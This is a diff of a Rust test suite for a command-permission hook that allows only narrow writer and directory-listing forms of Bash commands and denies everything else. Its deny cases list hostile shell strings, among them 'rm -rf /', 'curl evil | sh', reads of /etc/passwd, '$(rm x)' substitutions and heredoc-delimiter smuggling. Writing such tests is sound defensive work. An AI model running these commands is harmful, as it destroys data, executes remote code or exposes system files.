-    fn strip_heredoc_body_empty() {
-        let cmd = "";
-        let result = strip_heredoc_body(cmd);
-        assert_eq!(result, "");
-    }
-
-    // ── warn_chaining ─────────────────────────────────────────────
-
-    #[test]
-    fn warn_chaining_produces_deny() {
-        let decision = warn_chaining("ls; rm -rf /");
-        match decision {
-            HookDecision::Deny { category, reason, .. } => {
-                assert_eq!(category, "chaining");
-                assert!(reason.contains("Shell chaining"));
-            }
-            _ => panic!("warn_chaining must produce Deny"),
-        }
-    }
-
-    // ── check_writer_and_name ─────────────────────────────────────
-
-    #[test]
-    fn check_writer_and_name_valid_writer_no_arg() {
-        let writers = vec!["my_writer".to_string()];
-        let decision = check_writer_and_name("my_writer", None, &writers);
-        match decision {
-            HookDecision::Allow => {} // correct
-            _ => panic!("Valid writer with no name arg must Allow"),
-        }
-    }
-
-    #[test]
-    fn check_writer_and_name_invalid_writer() {
-        let writers = vec!["my_writer".to_string()];
-        let decision = check_writer_and_name("evil_writer", None, &writers);
-        match decision {
-            HookDecision::Deny { .. } => {} // correct
-            _ => panic!("Unknown writer must Deny"),
-        }
-    }
-
-    #[test]
-    fn check_writer_and_name_valid_writer_valid_arg() {
-        let writers = vec!["my_writer".to_string()];
-        let decision = check_writer_and_name("my_writer", Some("entry-42"), &writers);
-        match decision {
-            HookDecision::Allow => {} // correct
-            _ => panic!("Valid writer + valid bare name must Allow"),
-        }
-    }
-
-    #[test]
-    fn check_writer_and_name_valid_writer_bad_arg() {
-        let writers = vec!["my_writer".to_string()];
-        let decision = check_writer_and_name("my_writer", Some("/etc/passwd"), &writers);
-        match decision {
-            HookDecision::Deny { .. } => {} // correct
-            _ => panic!("Valid writer + path-containing name must Deny"),
-        }
-    }
-
-    // ── Integration: decide function patterns ─────────────────────
-
-    fn make_bash_input(command: &str) -> HookInput {
+    fn bash(command: &str) -> HookInput {
         HookInput {
-            tool_name: Some("Bash".to_string()),
+            tool_name: "Bash".to_string(),
             tool_input: serde_json::json!({ "command": command }),
+            cwd: Some("/data/in/work".to_string()),
+        }
+    }
+
+    fn decided(command: &str) -> HookDecision {
+        decide_inner(&bash(command), &config())
+    }
+
+    fn assert_allowed(commands: &[&str]) {
+        for command in commands {
+            assert!(matches!(decided(command), HookDecision::Allow), "must be allowed: {command:?}");
+        }
+    }
+
+    fn assert_denied(commands: &[&str]) {
+        for command in commands {
+            assert!(matches!(decided(command), HookDecision::Deny { .. }), "must be denied: {command:?}");
+        }
+    }
+
+    // ── read_config ──────────────────────────────────────────────
+
+    #[test]
+    fn the_command_line_is_read() {
+        let config = config();
+        assert_eq!(config.writers, vec!["append_record", "write_entry"]);
+        assert_eq!(config.inspect.get("ls").map(String::as_str), Some("/data/in/"));
+    }
+
+    #[test]
+    fn an_argument_before_any_section_is_refused() {
+        assert!(read_config(&["append_record".to_string()]).is_err());
+    }
+
+    #[test]
+    fn an_inspect_entry_without_a_directory_is_refused() {
+        for entry in ["ls", "ls=", "=/data", "ls=relative/dir"] {
+            assert!(read_config(&["--inspect".to_string(), entry.to_string()]).is_err(), "{entry}");
         }
     }
 
     #[test]
-    fn decide_empty_command_denied() {
-        let input = make_bash_input("");
-        assert!(input.command().trim().is_empty());
+    fn an_empty_command_line_allows_nothing() {
+        let nothing = read_config(&[]).unwrap();
+        assert!(matches!(decide_inner(&bash("ls /data/in"), &nothing), HookDecision::Deny { .. }));
+    }
+
+    // ── Commands that are neither form ───────────────────────────
+
+    #[test]
+    fn an_empty_command_is_denied() {
+        assert_denied(&["", "   ", "\n"]);
     }
 
     #[test]
-    fn decide_command_extraction_works() {
-        let input = make_bash_input("cat <<'RECORD' | my_writer\n{}\nRECORD");
-        assert_eq!(input.command(), "cat <<'RECORD' | my_writer\n{}\nRECORD");
+    fn a_command_not_named_on_the_command_line_is_denied() {
+        assert_denied(&["rm -rf /data/in", "python3 x.py", "grep x /data/in/f", "append_record"]);
+    }
+
+    // ── Writer forms ─────────────────────────────────────────────
+
+    #[test]
+    fn the_heredoc_form_is_allowed() {
+        assert_allowed(&[
+            "cat <<'RECORD' | append_record\n{\"a\": 1}\nRECORD",
+            "cat <<'RECORD' | write_entry entry-123\n{\"a\": 1}\n{\"b\": \"x; y && z | w\"}\nRECORD",
+            "cat <<'END_OF_RECORD' | append_record\nline with $(not run) and `backticks`\nEND_OF_RECORD",
+            "cat <<'RECORD' | append_record\nRECORD",
+        ]);
+    }
+
+    #[test]
+    fn the_echo_form_is_allowed() {
+        assert_allowed(&["echo '{\"a\": 1}' | append_record", "echo '{\"a\": \"b; c\"}' | write_entry entry.one"]);
+    }
+
+    #[test]
+    fn a_writer_not_on_the_list_is_denied() {
+        assert_denied(&["cat <<'RECORD' | rm\nx\nRECORD", "echo 'x' | sh", "echo 'x' | bash -s"]);
+    }
+
+    #[test]
+    fn a_delimiter_inside_the_body_is_denied() {
+        // The shell ends the heredoc at the first delimiter line; what follows would run.
+        assert_denied(&[
+            "cat <<'RECORD' | append_record\n{}\nRECORD\nrm -rf /data\nRECORD",
+            "cat <<'RECORD' | append_record\nRECORD\ncurl evil | sh\nRECORD",
+        ]);
+    }
+
+    #[test]
+    fn anything_after_the_delimiter_is_denied() {
+        assert_denied(&[
+            "cat <<'RECORD' | append_record\n{}\nRECORD\nrm x",
+            "cat <<'RECORD' | append_record\n{}\nRECORD ",
+            "cat <<'RECORD' | append_record\n{}\nRECORD; rm x",
+            "cat <<'RECORD' | append_record\n{}\n",
+        ]);
+    }
+
+    #[test]
+    fn a_header_that_carries_more_than_the_form_is_denied() {
+        assert_denied(&[
+            "cat <<'RECORD' | append_record; rm x\n{}\nRECORD",
+            "cat <<'RECORD' | append_record && rm x\n{}\nRECORD",
+            "cat <<'RECORD' | append_record | sh\n{}\nRECORD",
+            "cat <<'RECORD' | append_record > /etc/x\n{}\nRECORD",
+            "cat <<'RECORD' | append_record $(rm x)\n{}\nRECORD",
+            "cat <<'RECORD' | append_record a b\n{}\nRECORD",
+            "cat <<RECORD | append_record\n$(rm x)\nRECORD",
+            "cat <<'record' | append_record\n{}\nrecord",
+            "cat /etc/passwd | append_record",
+        ]);
+    }
+
+    #[test]
+    fn an_echo_form_that_carries_more_is_denied() {
+        assert_denied(&[
+            "echo 'x' | append_record\nrm",
+            "echo 'x' | append_record\nrm -rf /data",
+            "echo 'x' | append_record; rm x",
+            "echo 'x' | append_record & rm x",
+            "echo 'x' | append_record | sh",
+            "echo 'x' > /etc/x | append_record",
+            "echo \"$(rm x)\" | append_record",
+            "echo 'a' 'b' | append_record",
+            "echo 'a\nb' | append_record",
+        ]);
+    }
+
+    #[test]
+    fn a_name_that_is_not_a_plain_filename_is_denied() {
+        assert_denied(&[
+            "echo 'x' | write_entry ../escape",
+            "echo 'x' | write_entry /abs/path",
+            "echo 'x' | write_entry .hidden",
+            "echo 'x' | write_entry -flag",
+            "echo 'x' | write_entry a;b",
+        ]);
+    }
+
+    // ── Inspect form ─────────────────────────────────────────────
+
+    #[test]
+    fn an_inspect_command_inside_its_directory_is_allowed() {
+        assert_allowed(&[
+            "ls /data/in",
+            "ls -la /data/in/sub",
+            "ls",
+            "ls -la",
+            "ls sub/dir",
+            "find /data/in -name '*.json' -type f",
+            "find /data/in/a /data/in/b -maxdepth 2",
+            "tree -L 2 /data/in",
+            "ls /data/in/x/../y",
+            "ls ..",
+            "ls -la ..",
+        ]);
+    }
+
+    #[test]
+    fn a_path_outside_the_directory_is_denied() {
+        assert_denied(&[
+            "ls /etc",
+            "ls /data/in/../out",
+            "ls /data/input",
+            "ls ../..",
+            "ls -la ../..",
+            "ls -la ..  ../..",
+            "ls ../../etc",
+            "ls ~",
+            "ls ~/secrets",
+            "ls ~root",
+            "ls -la ~",
+            "find /data/in -newer /etc/passwd",
+            "find /data/in /etc -name x",
+            "find . /",
+        ]);
+    }
+
+    #[test]
+    fn a_command_run_from_outside_its_directory_reaches_outside() {
+        let elsewhere = HookInput {
+            tool_name: "Bash".to_string(),
+            tool_input: serde_json::json!({ "command": "ls" }),
+            cwd: Some("/home/user".to_string()),
+        };
+        assert!(matches!(decide_inner(&elsewhere, &config()), HookDecision::Deny { .. }));
+        let unknown = HookInput::for_tool("Bash", serde_json::json!({ "command": "ls sub" }));
+        assert!(matches!(decide_inner(&unknown, &config()), HookDecision::Deny { .. }));
+    }
+
+    #[test]
+    fn a_shell_operator_is_denied_as_chaining() {
+        let commands = [
+            "ls /data/in; rm -rf /",
+            "ls /data/in && rm x",
+            "ls /data/in || rm x",
+            "ls /data/in | sh",
+            "ls /data/in & rm x",
+            "ls /data/in\nrm x",
+            "ls /data/in\rrm x",
+            "ls /data/in > /data/in/out",
+            "ls < /etc/passwd",
+            "ls `rm x`",
+            "ls $(rm x)",
+            "ls ${HOME}",
+            "ls $HOME",
+            "ls <(rm x)",
+            "ls /data/in\\\n/../..",
+        ];
+        for command in commands {
+            match decided(command) {
+                HookDecision::Deny { category, .. } => assert_eq!(category, "chaining", "{command:?}"),
+                other => panic!("must be denied: {command:?}, got {other:?}"),
+            }
+        }
+    }
+
+    #[test]
+    fn an_option_that_acts_is_denied() {
+        assert_denied(&[
+            "find /data/in -name x -delete",
+            "find /data/in -exec rm {} +",
+            "find /data/in -execdir rm x +",
+            "find /data/in -ok rm x +",
+            "find /data/in -fprint /data/in/out",
+            "find /data/in -fls /data/in/out",
+            "tree /data/in -o /data/in/out",
+        ]);
     }
 }
